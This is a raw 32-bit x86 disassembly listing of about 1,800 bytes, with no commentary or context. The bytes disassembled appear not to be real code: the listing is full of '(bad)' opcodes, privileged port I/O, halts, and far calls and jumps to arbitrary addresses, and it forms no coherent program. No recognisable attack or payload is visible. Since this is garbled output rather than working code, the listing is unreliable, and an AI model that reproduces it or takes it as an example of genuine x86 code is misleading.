  41ab47:	xchg   esi,eax
  41ab48:	retf   0x164
  41ab4b:	inc    ebp
  41ab4c:	mov    ds:0xcd4f279d,eax
  41ab51:	loope  0x41aade
  41ab53:	cld    
  41ab54:	loopne 0x41aafa
  41ab56:	outs   dx,DWORD PTR ds:[esi]
  41ab57:	xor    esi,DWORD PTR [edi+ebx*8-0x5f]
  41ab5b:	jo     0x41abd0
  41ab5d:	out    0x81,al
  41ab5f:	mov    ecx,0x4a110efe
  41ab64:	(bad)  
  41ab65:	dec    BYTE PTR [ecx]
  41ab67:	ins    BYTE PTR es:[edi],dx
  41ab68:	cmp    BYTE PTR [eax],ah
  41ab6a:	(bad)  
  41ab6b:	lods   al,BYTE PTR ds:[esi]
  41ab6c:	xlat   BYTE PTR ds:[ebx]
  41ab6d:	jb     0x41abc9
  41ab6f:	or     DWORD PTR [eax],ecx
  41ab71:	and    BYTE PTR [ebx+edi*1-0x3a11ffe3],al
  41ab78:	and    eax,0xe1dbc4d
  41ab7d:	sub    DWORD PTR [edx],ecx
  41ab7f:	dec    ebx
  41ab80:	cmp    edi,DWORD PTR [edi]
  41ab82:	mov    BYTE PTR [ecx-0x3d6a5e31],bl
  41ab88:	repnz xchg edi,eax
  41ab8a:	fxch   st(1)
  41ab8c:	fwait
  41ab8d:	sbb    dh,BYTE PTR [edx]
  41ab8f:	pop    ss
  41ab90:	pop    ds
  41ab91:	jne    0x41ab2e
  41ab93:	mov    bh,0xf6
  41ab95:	push   es
  41ab96:	pop    esp
  41ab97:	call   0x51443ae
  41ab9c:	jl     0x41aba7
  41ab9e:	hlt    
  41ab9f:	ins    DWORD PTR es:[edi],dx
  41aba0:	dec    ebp
  41aba1:	ins    DWORD PTR es:[edi],dx
  41aba2:	cmp    BYTE PTR [ebp+0x36],0xaa
  41aba6:	pop    ds
  41aba7:	xlat   BYTE PTR ds:[ebx]
  41aba8:	pop    ecx
  41aba9:	out    dx,al
  41abaa:	mov    al,0x6b
  41abac:	and    al,0x18
  41abae:	mov    DWORD PTR [edi-0x77337a41],edx
  41abb4:	mov    ah,0x5d
  41abb6:	cli    
  41abb7:	pop    ecx
  41abb8:	cmc    
  41abb9:	xor    ecx,DWORD PTR [ebx+0x6b766be0]
  41abbf:	xchg   ebx,eax
  41abc0:	inc    ebp
  41abc1:	push   edi
  41abc3:	sbb    DWORD PTR [edx],edx
  41abc5:	mov    ds:0xdc73d4ae,al
  41abca:	loop   0x41abeb
  41abcc:	add    eax,0x1f8169f9
  41abd1:	mov    ebp,edi
  41abd3:	pop    es
  41abd4:	fcomp  DWORD PTR [ecx+esi*1+0x78]
  41abd8:	sub    DWORD PTR [edi],0xffffff88
  41abdb:	into   
  41abdc:	popf   
  41abdd:	mov    WORD PTR [ebx-0x15],cs
  41abe0:	or     al,0xd0
  41abe2:	test   BYTE PTR ds:0x36ecd605,dl
  41abe8:	add    eax,0x90853c31
  41abed:	les    esi,FWORD PTR [edi]
  41abef:	test   eax,0x4a483c15
  41abf4:	push   ss
  41abf5:	and    al,0xc7
  41abf7:	call   0x718c7316
  41abfc:	mov    esi,0x31b35cd
  41ac01:	stos   DWORD PTR es:[edi],eax
  41ac02:	addr16 xor eax,0xc22a82ee
  41ac08:	jp     0x41abde
  41ac0a:	ins    BYTE PTR es:[edi],dx
  41ac0b:	nop
  41ac0c:	add    edi,0xe6058e6e
  41ac12:	les    ebx,FWORD PTR [esi]
  41ac14:	(bad)
  41ac18:	adc    al,0xcc
  41ac1a:	xor    DWORD PTR [edx],0xfbbca465
  41ac20:	clc    
  41ac21:	call   0x957b:0xacfd5c61
  41ac28:	pop    edx
  41ac29:	mov    edx,0x90c49786
  41ac2e:	dec    ebx
  41ac2f:	jecxz  0x41abbb
  41ac31:	fs retf 
  41ac33:	fisubr WORD PTR [ebx]
  41ac35:	jmp    0x41abf5
  41ac37:	(bad)  
  41ac38:	fsub   QWORD PTR [eax-0x7f]
  41ac3b:	jp     0x41ac12
  41ac3d:	loope  0x41ac27
  41ac3f:	mov    ss,WORD PTR [ebx-0x7995ea8b]
  41ac45:	ret    
  41ac46:	arpl   bp,si
  41ac48:	xchg   esp,eax
  41ac49:	(bad)
  41ac4d:	xlat   BYTE PTR ds:[ebx]
  41ac4e:	sub    ecx,ebp
  41ac50:	es pushf 
  41ac52:	adc    al,0x95
  41ac54:	mov    BYTE PTR [edi-0x10],0x60
  41ac58:	mov    gs,WORD PTR [esi+0x1d4f50dc]
  41ac5e:	pop    edx
  41ac5f:	xchg   ecx,eax
  41ac60:	pop    ecx
  41ac61:	jno    0x41ac18
  41ac63:	into   
  41ac64:	stos   DWORD PTR es:[edi],eax
  41ac65:	push   0x16
  41ac67:	data16 jmp 0x41ac79
  41ac6a:	ss hlt 
  41ac6c:	jmp    0xcf4c2575
  41ac71:	push   eax
  41ac72:	push   edi
  41ac73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac74:	ins    BYTE PTR es:[edi],dx
  41ac75:	stos   BYTE PTR es:[edi],al
  41ac76:	icebp  
  41ac77:	pop    eax
  41ac78:	ss inc esp
  41ac7a:	lods   al,BYTE PTR ds:[esi]
  41ac7b:	sub    al,bh
  41ac7d:	and    esi,DWORD PTR [edx-0x7e]
  41ac80:	sti    
  41ac81:	push   esi
  41ac82:	add    edi,edx
  41ac84:	gs inc edx
  41ac86:	mov    WORD PTR [edi-0x2270f62e],gs
  41ac8c:	xchg   esp,eax
  41ac8d:	mov    cl,0x5a
  41ac8f:	pop    edi
  41ac90:	and    ecx,DWORD PTR [eax+edx*4-0x24]
  41ac94:	sub    al,0x42
  41ac96:	or     edi,ebx
  41ac98:	fisttp WORD PTR [ebp-0x4a]
  41ac9b:	adc    DWORD PTR [ecx-0x20],esp
  41ac9e:	dec    ecx
  41ac9f:	push   ecx
  41aca0:	adc    dl,dl
  41aca2:	sub    BYTE PTR [ebx+edx*4],bh
  41aca5:	call   0xf2a1:0x11ea5f1a
  41acac:	push   ebp
  41acad:	out    dx,eax
  41acae:	push   cs
  41acaf:	inc    eax
  41acb0:	push   0x622204fa
  41acb5:	scas   al,BYTE PTR es:[edi]
  41acb6:	out    0xca,eax
  41acb8:	xor    eax,edi
  41acba:	popa   
  41acbb:	mov    ah,0x1
  41acbd:	jae    0x41aca7
  41acbf:	or     eax,DWORD PTR [edi]
  41acc1:	pop    ebp
  41acc2:	push   ebp
  41acc3:	ss sahf 
  41acc5:	jns    0x41ac9c
  41acc7:	aam    0x3d
  41acc9:	outs   dx,DWORD PTR ds:[esi]
  41acca:	fisubr DWORD PTR [edx+0x4cd95b68]
  41acd0:	aas    
  41acd1:	repz mov ebp,0xcd1136d7
  41acd7:	xchg   DWORD PTR [esi+0x26],esi
  41acda:	dec    esi
  41acdb:	popf   
  41acdc:	dec    esp
  41acdd:	call   0x3d12:0xc3707748
  41ace4:	aas    
  41ace5:	add    ch,bl
  41ace7:	in     eax,dx
  41ace8:	aaa    
  41ace9:	pusha  
  41acea:	imul   edx,DWORD PTR [esi],0x45
  41aced:	std    
  41acee:	push   ecx
  41acef:	popf   
  41acf0:	mov    ebp,0xb553c1fe
  41acf5:	fist   WORD PTR [eax+edi*2+0x27]
  41acf9:	jae    0x41ad18
  41acfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acfc:	pop    edi
  41acfd:	add    ebx,esp
  41acff:	jne    0x41ace1
  41ad01:	fist   DWORD PTR [edi]
  41ad03:	mov    ds,WORD PTR cs:[ebx-0x73]
  41ad07:	cmp    BYTE PTR [ecx-0x7c],bl
  41ad0a:	xor    edi,ebx
  41ad0c:	fbld   TBYTE PTR [edx+0x2f61de77]
  41ad12:	popf   
  41ad13:	cli    
  41ad14:	mov    esp,0xadd0c65e
  41ad19:	add    ah,BYTE PTR [esi]
  41ad1b:	ret    0x9bd7
  41ad1e:	retf   0x660a
  41ad21:	mov    dh,0xd7
  41ad23:	sbb    eax,0x8fbea07b
  41ad28:	jg     0x41ad31
  41ad2a:	pop    esp
  41ad2b:	xchg   DWORD PTR [edx],esi
  41ad2d:	mov    ah,0xff
  41ad2f:	xchg   ebx,eax
  41ad30:	push   edx
  41ad31:	adc    ah,BYTE PTR [edi+0x5d]
  41ad34:	inc    ebp
  41ad35:	inc    edx
  41ad36:	push   ecx
  41ad37:	inc    esi
  41ad38:	das    
  41ad39:	pusha  
  41ad3a:	pop    ds
  41ad3b:	dec    BYTE PTR [ebp-0x1886ff88]
  41ad41:	dec    eax
  41ad42:	cmc    
  41ad43:	sub    DWORD PTR [eax+0x3b020dc4],0x926ff887
  41ad4d:	dec    BYTE PTR [ebx]
  41ad4f:	cld    
  41ad50:	push   es
  41ad51:	das    
  41ad52:	inc    DWORD PTR [esi]
  41ad54:	and    esi,edi
  41ad56:	loopne 0x41ad78
  41ad58:	pop    ds
  41ad59:	std    
  41ad5a:	dec    edi
  41ad5b:	mov    bl,0xfb
  41ad5d:	jmp    esp
  41ad5f:	add    al,0xaa
  41ad61:	aad    0x95
  41ad63:	xlat   BYTE PTR ds:[ebx]
  41ad64:	aaa    
  41ad65:	adc    al,0xc8
  41ad67:	pop    ebx
  41ad68:	mov    eax,ds:0xd66dca87
  41ad6d:	leave  
  41ad6e:	and    DWORD PTR ds:0x68341b63,0xfffffff8
  41ad75:	jmp    0xfcd7:0xda3b98c9
  41ad7c:	loop   0x41ad12
  41ad7e:	pop    eax
  41ad7f:	and    al,0xf4
  41ad81:	inc    esi
  41ad82:	bound  edx,QWORD PTR [esi]
  41ad84:	scas   eax,DWORD PTR es:[edi]
  41ad85:	ss jge 0x41add1
  41ad88:	mov    ecx,0x7a2bac97
  41ad8d:	jne    0x41ad93
  41ad8f:	repz scas eax,DWORD PTR es:[edi]
  41ad91:	or     al,0xba
  41ad93:	xor    dl,BYTE PTR [ebx+edi*4-0x3c]
  41ad97:	mov    ds:0x688659ad,eax
  41ad9c:	cmp    dh,BYTE PTR [ebp+0x2606c88c]
  41ada2:	out    0xd,eax
  41ada4:	sbb    ecx,eax
  41ada6:	pop    edi
  41ada7:	xor    DWORD PTR [ecx+0x17c7bfcd],ebx
  41adad:	lahf   
  41adae:	test   DWORD PTR [ebx+0xa647a8e],0x1f35367f
  41adb8:	enter  0x28d1,0x67
  41adbc:	ret    0xf590
  41adbf:	call   0x29e2e33b
  41adc4:	pop    ebx
  41adc5:	pushf  
  41adc6:	scas   eax,DWORD PTR es:[edi]
  41adc7:	into   
  41adc8:	sub    bh,0x20
  41adcb:	mov    ds:0x880bc11b,al
  41add0:	inc    edi
  41add1:	push   ds
  41add2:	cmp    BYTE PTR [ebp+0x17],bh
  41add5:	add    DWORD PTR [eax+0x16c39218],edi
  41addb:	inc    esp
  41addc:	push   0x6d
  41adde:	mov    ebp,0x64e40153
  41ade3:	(bad)  
  41ade4:	hlt    
  41ade5:	or     ch,BYTE PTR [esi-0x9]
  41ade8:	lods   eax,DWORD PTR ds:[esi]
  41ade9:	pop    ebx
  41adea:	fisub  WORD PTR [edi+0x37a37fae]
  41adf0:	sub    cl,ch
  41adf2:	lock in eax,dx
  41adf4:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41adf6:	sub    ecx,ebx
  41adf8:	dec    esp
  41adf9:	(bad)  
  41adfa:	out    dx,al
  41adfb:	xor    DWORD PTR [eax-0x5a],edi
  41adfe:	adc    ch,BYTE PTR [ecx-0x22f93887]
  41ae04:	std    
  41ae05:	xchg   ebx,eax
  41ae06:	mov    ds:0x42719594,al
  41ae0b:	lock imul cx,WORD PTR [eax+0x5e80d9d3],0x6e9b
  41ae15:	xor    al,0x5
  41ae18:	xchg   esi,eax
  41ae19:	popf   
  41ae1a:	sub    eax,0xf35fee99
  41ae1f:	popf   
  41ae20:	aaa    
  41ae21:	scas   al,BYTE PTR es:[edi]
  41ae22:	rol    DWORD PTR [ebx+0x750c82fe],1
  41ae28:	sub    eax,0xfe4f3fdc
  41ae2d:	jp     0x41ae1b
  41ae2f:	out    0x55,al
  41ae31:	mov    WORD PTR [ebp-0x760a5859],cs
  41ae37:	arpl   WORD PTR ds:0xcc5e83b9,bx
  41ae3d:	xor    eax,0xd192c3f5
  41ae42:	fld    QWORD PTR [ebp+0x1f]
  41ae45:	popf   
  41ae46:	dec    edx
  41ae47:	out    dx,eax
  41ae48:	sar    ebp,1
  41ae4a:	je     0x41aeab
  41ae4c:	dec    ebx
  41ae4d:	repz aam 0x21
  41ae50:	call   0xbd0:0xb31ec8d3
  41ae57:	add    esi,esi
  41ae59:	jbe    0x41ae66
  41ae5b:	xor    bh,BYTE PTR [esi-0x5cf9c516]
  41ae61:	(bad)  
  41ae62:	jne    0x41ae17
  41ae64:	imul   ecx,DWORD PTR [edi+0x58],0xffffffe2
  41ae68:	test   eax,0x2882e617
  41ae6d:	dec    ebp
  41ae6e:	jecxz  0x41ae1f
  41ae70:	cmp    al,0x3c
  41ae72:	(bad)  
  41ae73:	fwait
  41ae74:	in     eax,dx
  41ae75:	sub    ebp,eax
  41ae77:	sub    ecx,edx
  41ae79:	xchg   ebx,eax
  41ae7a:	les    esi,FWORD PTR [ecx]
  41ae7c:	add    BYTE PTR [esi-0xf],dl
  41ae7f:	pop    edx
  41ae80:	pop    ebp
  41ae81:	mov    bl,0xf8
  41ae83:	or     BYTE PTR [edi+0x5f568521],dl
  41ae89:	jle    0x41aea1
  41ae8b:	dec    ebp
  41ae8c:	xchg   edi,eax
  41ae8d:	inc    esp
  41ae8e:	cmc    
  41ae8f:	mov    eax,ds:0xf0c0ae3c
  41ae94:	sub    al,0x35
  41ae96:	xor    esi,DWORD PTR ds:0x240b9337
  41ae9c:	push   0x62
  41ae9e:	sbb    eax,0x55261423
  41aea3:	icebp  
  41aea4:	mov    dh,0x35
  41aea6:	ror    DWORD PTR fs:[edi-0x5a1393eb],cl
  41aead:	adc    eax,0xa35c6568
  41aeb2:	pop    esp
  41aeb3:	shl    dx,1
  41aeb6:	lods   eax,DWORD PTR ds:[esi]
  41aeb7:	pop    ebx
  41aeb8:	rcl    BYTE PTR [edi],0x64
  41aebb:	mov    dl,0x4f
  41aebd:	dec    eax
  41aebe:	sub    DWORD PTR [ebp-0x2da69491],0x76
  41aec5:	sub    bl,dh
  41aec7:	jmp    0xdd717ef
  41aecc:	repz xchg edi,eax
  41aece:	pop    edi
  41aecf:	pop    edi
  41aed0:	iret   
  41aed1:	mov    ch,0xc7
  41aed3:	pmovmskb eax,mm1
  41aed6:	call   0x5377:0xff7424aa
  41aedd:	rol    DWORD PTR [ecx-0x3a689a98],0x9c
  41aee4:	inc    edi
  41aee5:	push   ds
  41aee6:	or     eax,0x1a05d942
  41aeeb:	or     al,0x47
  41aeed:	mov    ebx,0xfd242572
  41aef2:	mov    ch,0xd2
  41aef4:	pusha  
  41aef5:	inc    edi
  41aef6:	ds push ecx
  41aef8:	pushf  
  41aef9:	mov    ebx,DWORD PTR [esi-0x3b5adbfb]
  41aeff:	jne    0x41af44
  41af01:	cmp    BYTE PTR [ebx],dh
  41af03:	dec    esp
  41af04:	(bad)  
  41af05:	(bad)  
  41af07:	jmp    0x8116:0x27900a28
  41af0e:	nop
  41af0f:	cld    
  41af10:	sbb    DWORD PTR [edi],edi
  41af12:	adc    DWORD PTR [eax-0x5d],edx
  41af15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af16:	sub    al,0xd4
  41af18:	sub    BYTE PTR [ecx],0x59
  41af1b:	popf   
  41af1c:	retf   
  41af1d:	div    BYTE PTR [esi]
  41af1f:	cmp    al,BYTE PTR [ebp-0xa]
  41af22:	adc    cl,BYTE PTR [esi-0xf]
  41af25:	adc    BYTE PTR [ebx-0xa],ch
  41af28:	push   edx
  41af29:	dec    esi
  41af2a:	int    0xc5
  41af2c:	jnp    0x41af34
  41af2e:	pop    edx
  41af2f:	ja     0x41af52
  41af31:	ret    0x492f
  41af34:	and    bh,BYTE PTR [ecx+0x276e1ce2]
  41af3a:	sub    ebx,esi
  41af3c:	dec    edi
  41af3d:	mov    bl,bl
  41af3f:	bound  esp,QWORD PTR [eax]
  41af41:	loop   0x41af95
  41af43:	pushf  
  41af44:	out    dx,eax
  41af45:	inc    DWORD PTR [edi]
  41af47:	mov    dl,0x3
  41af49:	mov    al,0xe1
  41af4b:	call   0x5d1a80b8
  41af50:	jno    0x41af43
  41af52:	or     eax,DWORD PTR [ecx+0x5]
  41af55:	outs   dx,BYTE PTR ds:[esi]
  41af56:	jg     0x41aedd
  41af58:	mov    al,ds:0xc91f7e41
  41af5d:	push   ds
  41af5e:	inc    ecx
  41af5f:	in     al,0x53
  41af61:	xor    DWORD PTR ds:[ecx+eiz*2-0x5e4dca64],ebx
  41af69:	mov    ah,0x6
  41af6b:	lods   al,BYTE PTR ds:[esi]
  41af6c:	loope  0x41af91
  41af6e:	call   0xcc565bf4
  41af73:	jns    0x41afba
  41af75:	loop   0x41af69
  41af77:	retf   0x8a47
  41af7a:	xor    al,0x64
  41af7c:	test   al,0xb2
  41af7e:	push   esi
  41af7f:	ss xchg ebx,eax
  41af81:	cld    
  41af82:	out    0xb3,eax
  41af84:	lods   al,BYTE PTR ds:[esi]
  41af85:	xchg   edi,eax
  41af86:	into   
  41af87:	push   eax
  41af88:	add    BYTE PTR [ebp+0x79],ah
  41af8b:	lods   eax,DWORD PTR ds:[esi]
  41af8c:	push   cs
  41af8d:	jb     0x41af4a
  41af8f:	fcmovu st,st(5)
  41af91:	popa   
  41af92:	mov    eax,0x60e7ba50
  41af97:	call   0x8661:0xf6fdb469
  41af9e:	push   0xb80ecdae
  41afa3:	mov    edi,0x2a7733f5
  41afa8:	push   esp
  41afa9:	fst    DWORD PTR [ebx-0x5a6c3430]
  41afaf:	push   0x8896e766
  41afb4:	(bad)  
  41afb5:	mov    dl,0xe6
  41afb7:	mov    ecx,0xc97432fc
  41afbc:	add    esi,esi
  41afbe:	lahf   
  41afbf:	mov    al,ds:0x55ffe35f
  41afc4:	lods   eax,DWORD PTR ds:[esi]
  41afc5:	cld    
  41afc6:	fstp   TBYTE PTR [esi-0x49]
  41afc9:	jne    0x41b048
  41afcb:	pop    esp
  41afcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afcd:	outs   dx,BYTE PTR ds:[esi]
  41afce:	mov    edx,0xc93d66b3
  41afd3:	ret    0x37c5
  41afd6:	pushf  
  41afd7:	int3   
  41afd8:	push   ss
  41afd9:	leave  
  41afda:	(bad)  
  41afdb:	jp     0x41afaf
  41afdd:	int3   
  41afde:	cmp    ebp,DWORD PTR [esi+0x6ef244d9]
  41afe4:	jl     0x41afb8
  41afe6:	xor    eax,0xd11cc389
  41afeb:	call   0x6861:0xfb2b313a
  41aff2:	push   cs
  41aff3:	and    ch,0x8e
  41aff6:	sbb    al,0x81
  41aff8:	(bad)  
  41aff9:	test   ah,0xa2
  41affc:	repz xor DWORD PTR ds:0xfead6629,ebp
  41b003:	jge    0x41afe7
  41b005:	mov    dh,bh
  41b007:	add    al,0xcf
  41b009:	xlat   BYTE PTR ds:[ebx]
  41b00a:	lods   al,BYTE PTR ds:[esi]
  41b00b:	fidivr DWORD PTR ss:[esi]
  41b00e:	ins    BYTE PTR es:[edi],dx
  41b00f:	and    esp,DWORD PTR [esi]
  41b011:	imul   ecx,DWORD PTR [edx-0x2c],0xa
  41b015:	cmp    DWORD PTR [ebx],0x5de02c7e
  41b01b:	retf   
  41b01c:	pop    esi
  41b01d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b01e:	in     al,0x8f
  41b020:	dec    ecx
  41b021:	mov    eax,0x10e27012
  41b026:	std    
  41b027:	std    
  41b028:	retf   0x992d
  41b02b:	in     eax,dx
  41b02c:	add    DWORD PTR ds:[esi-0x3],ecx
  41b030:	mov    ss,eax
  41b032:	int3   
  41b033:	dec    eax
  41b034:	xor    bh,cl
  41b036:	ja     0x41b023
  41b038:	adc    DWORD PTR [ebp-0x69],eax
  41b03b:	lahf   
  41b03c:	cmp    bl,bh
  41b03e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b03f:	inc    ebp
  41b040:	add    DWORD PTR [esi],ebp
  41b042:	dec    edi
  41b043:	adc    al,0xe3
  41b045:	mov    eax,ds:0xe87dafd5
  41b04a:	aas    
  41b04b:	mov    DWORD PTR [ecx-0x6a],esi
  41b04e:	(bad)  [edi-0x76]
  41b051:	arpl   dx,bx
  41b053:	jb     0x41afda
  41b055:	mov    fs,WORD PTR [esi-0x19ab872e]
  41b05b:	push   esp
  41b05c:	xchg   esi,eax
  41b05d:	in     eax,dx
  41b05e:	dec    edi
  41b05f:	push   0xb143a18c
  41b064:	out    dx,eax
  41b065:	sub    eax,DWORD PTR [edx-0x3f914a4c]
  41b06b:	adc    BYTE PTR [esi+edi*8+0x1f3d8915],0xc
  41b073:	bound  esi,QWORD PTR [eax+0x19fadfcd]
  41b079:	and    ch,ch
  41b07b:	outs   dx,DWORD PTR ds:[esi]
  41b07c:	xor    cl,dl
  41b07e:	test   bl,bh
  41b080:	sub    BYTE PTR [edi+0x2e8fbb08],cl
  41b086:	push   ss
  41b087:	or     cl,ah
  41b089:	sar    DWORD PTR [eax+0x49],0x0
  41b08d:	enter  0x66a8,0x1e
  41b091:	dec    ebx
  41b092:	dec    BYTE PTR [ebp-0x60]
  41b095:	scas   eax,DWORD PTR es:[edi]
  41b096:	fstp   DWORD PTR [eax+0x4a5f861b]
  41b09c:	push   edi
  41b09d:	arpl   bp,ax
  41b09f:	cdq    
  41b0a0:	lds    eax,FWORD PTR [ecx]
  41b0a2:	pop    ds
  41b0a3:	(bad)  
  41b0a4:	mov    eax,0x863778b0
  41b0a9:	sub    eax,ebx
  41b0ab:	out    dx,al
  41b0ac:	ins    DWORD PTR es:[edi],dx
  41b0ad:	adc    BYTE PTR ds:0x2cd64d0,bh
  41b0b3:	sub    dh,BYTE PTR [edi-0x5598d350]
  41b0b9:	mov    WORD PTR [esi+0x2852205],ds
  41b0bf:	inc    ebp
  41b0c0:	adc    BYTE PTR [edx-0x7217a143],ah
  41b0c6:	and    al,0x30
  41b0c8:	imul   edx,DWORD PTR [ebx+0x68f488e4],0x2e
  41b0cf:	dec    ebp
  41b0d0:	ins    BYTE PTR es:[edi],dx
  41b0d1:	aam    0x9
  41b0d3:	jle    0x41b0ef
  41b0d5:	sar    esi,0x50
  41b0d8:	add    ebx,DWORD PTR [esi+0x1fda9079]
  41b0de:	sub    al,0xf8
  41b0e0:	xor    BYTE PTR [ecx],al
  41b0e2:	in     eax,dx
  41b0e3:	cmp    al,0x5a
  41b0e5:	xor    edx,eax
  41b0e7:	cmc    
  41b0e8:	(bad)  
  41b0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0ea:	add    al,0x9e
  41b0ec:	fadd   st,st(3)
  41b0ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ef:	mov    cl,0x28
  41b0f1:	outs   dx,BYTE PTR ds:[esi]
  41b0f2:	xchg   ebp,eax
  41b0f3:	outs   dx,BYTE PTR ds:[esi]
  41b0f4:	or     BYTE PTR [esi-0x6e326a7a],ah
  41b0fa:	mov    dh,0x27
  41b0fc:	bound  ebp,QWORD PTR [eax-0xd]
  41b0ff:	jl     0x41b0cb
  41b101:	inc    edi
  41b102:	jnp    0x41b11c
  41b104:	or     edx,DWORD PTR [esi]
  41b106:	es jmp 0x41b0fa
  41b109:	adc    al,0xd0
  41b10b:	and    DWORD PTR [ecx-0x3d],0x756fd852
  41b112:	ret    
  41b113:	movlps QWORD PTR [esi],xmm5
  41b116:	pusha  
  41b117:	in     al,0x59
  41b119:	sub    BYTE PTR [ebx],ch
  41b11b:	adc    al,0xb
  41b11d:	xor    ebp,edi
  41b11f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b120:	mov    edx,0xf3bbb605
  41b125:	(bad)  
  41b126:	fdivr  QWORD PTR [esi]
  41b128:	rcl    BYTE PTR [ecx-0x62f32018],1
  41b12e:	mov    ds:0x5cdb6f3f,eax
  41b133:	daa    
  41b134:	or     BYTE PTR [eax-0x342853fd],0x5e
  41b13b:	mul    BYTE PTR [edi]
  41b13d:	lea    ebx,[eax-0x9]
  41b140:	jne    0x41b0f5
  41b142:	dec    esi
  41b143:	jbe    0x41b0df
  41b145:	sbb    eax,0x991a1b4b
  41b14a:	(bad)  
  41b14b:	pop    ss
  41b14c:	push   esi
  41b14d:	push   ecx
  41b14e:	adc    esp,ebx
  41b150:	loop   0x41b0ff
  41b152:	inc    eax
  41b153:	in     al,dx
  41b154:	xchg   ecx,eax
  41b155:	(bad)  
  41b156:	fyl2x  
  41b158:	(bad)  
  41b159:	popf   
  41b15a:	leave  
  41b15b:	xor    DWORD PTR [esi],ebx
  41b15d:	arpl   dx,di
  41b15f:	adc    eax,0x66137876
  41b164:	fild   DWORD PTR [esi+edi*2+0x6d]
  41b168:	mov    al,ds:0xc16e84b7
  41b16d:	bound  ecx,QWORD PTR [ebx+0x7c]
  41b170:	pop    edi
  41b171:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b173:	shr    edi,cl
  41b175:	nop
  41b176:	sti    
  41b177:	aas    
  41b178:	mov    dh,0x9
  41b17a:	xor    al,0x5d
  41b17c:	loopne 0x41b1f1
  41b17e:	inc    esi
  41b17f:	pop    ds
  41b180:	(bad)  
  41b181:	in     eax,dx
  41b182:	adc    eax,0x41f17168
  41b187:	mov    ebx,0x3f8ec9f5
  41b18c:	mov    eax,0xd7232116
  41b191:	jae    0x41b20e
  41b193:	addr16 hlt 
  41b195:	fs daa 
  41b197:	jo     0x41b171
  41b199:	mov    ebp,0xea09672a
  41b19e:	pop    ds
  41b19f:	sahf   
  41b1a0:	idiv   DWORD PTR [ebx-0x4e5206aa]
  41b1a6:	jno    0x41b1b0
  41b1a8:	inc    edi
  41b1a9:	xchg   esp,eax
  41b1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ab:	xor    bl,BYTE PTR [ebx-0x12069f6b]
  41b1b1:	sub    DWORD PTR [esi+ebp*1],edx
  41b1b4:	repz xlat BYTE PTR ds:[ebx]
  41b1b6:	inc    eax
  41b1b7:	cs std 
  41b1b9:	sub    BYTE PTR [esi-0x7d],ch
  41b1bc:	test   al,0x90
  41b1be:	jae    0x41b146
  41b1c0:	cli    
  41b1c1:	lods   eax,DWORD PTR ds:[esi]
  41b1c2:	outs   dx,BYTE PTR ds:[esi]
  41b1c3:	fisttp QWORD PTR [eax]
  41b1c5:	mov    eax,ds:0x1b79f486
  41b1ca:	xor    ah,BYTE PTR [ecx+eax*4]
  41b1cd:	jo     0x41b227
  41b1cf:	test   BYTE PTR [ecx+0x70f07e76],bh
  41b1d5:	and    eax,0xdd4ca334
  41b1da:	sub    BYTE PTR [edi-0x63],0xc7
  41b1de:	mov    al,ds:0x61610767
  41b1e3:	add    bh,BYTE PTR [edi+edx*8-0x28]
  41b1e7:	push   edi
  41b1e8:	sar    BYTE PTR [ebp-0x6a0f5d1c],cl
  41b1ee:	das    
  41b1ef:	jne    0x41b25f
  41b1f1:	neg    esi
  41b1f3:	scas   al,BYTE PTR es:[edi]
  41b1f4:	and    BYTE PTR [esi+0x52],0x73
  41b1f8:	mov    ds:0x30df91a9,eax
  41b1fd:	stc    
  41b1fe:	cli    
  41b1ff:	push   es
  41b200:	add    eax,0xe108727
  41b205:	test   BYTE PTR [ecx+edi*1+0x5b],bl
  41b209:	pop    esp
  41b20a:	in     al,dx
  41b20b:	sub    al,0x4
  41b20d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b20e:	sbb    eax,0xcde12641
  41b213:	push   ds
  41b214:	addr16 or al,0x38
  41b217:	sbb    ecx,ecx
  41b219:	jp     0x41b1ac
  41b21b:	inc    edx
  41b21c:	stc    
  41b21d:	push   edi
  41b21e:	lea    ecx,[ebx+0x559ba6ff]
  41b224:	mov    ch,0xd7
  41b226:	sub    esp,DWORD PTR [edx+0x36386e92]
  41b22c:	and    DWORD PTR [eax+0x1d],0xaf624dc3
  41b233:	xor    al,0x8b
  41b235:	popa   
  41b236:	ret    0xdeb8
  41b239:	dec    ebx
  41b23a:	or     al,0x2f
  41b23c:	jbe    0x41b28d
  41b23e:	shr    BYTE PTR [esi+eiz*4],1
  41b241:	push   esp
  41b242:	dec    edx
  41b243:	add    dl,BYTE PTR ds:0x92617a9c
  41b249:	scas   al,BYTE PTR es:[edi]
  41b24a:	xor    esp,eax
  41b24c:	aaa    
  41b24d:	pop    eax
  41b24e:	xor    esi,DWORD PTR [eax]
  41b250:	out    0xeb,al
  41b252:	jo     0x41b244
  41b254:	mov    cl,cl
  41b256:	jl     0x41b255
  41b258:	mov    WORD PTR [edx-0x136b1ad1],?
  41b25e:	push   cs
  41b25f:	sub    esp,ebx
  41b261:	lods   eax,DWORD PTR ds:[esi]
  41b262:	cmc    
  41b263:	jbe    0x41b210
  41b265:	dec    ebx
  41b266:	loop   0x41b23c
  41b268:	jbe    0x41b1ef
  41b26a:	test   ebp,edx
  41b26c:	xchg   DWORD PTR [eax],ebp
  41b26e:	push   ebx
  41b26f:	mov    cl,0xca
  41b271:	sub    ebx,esi
  41b273:	aad    0x3c
  41b275:	or     DWORD PTR [edx+0x9],ecx
  41b278:	sahf   
  41b279:	hlt    
  41b27a:	in     al,0x84
  41b27c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27d:	jbe    0x41b2e3
  41b27f:	dec    ecx
  41b280:	and    al,0x82
  41b282:	sar    bl,0x62
  41b285:	push   ds
  41b286:	jno    0x41b227
  41b288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b289:	or     edx,DWORD PTR [edi]
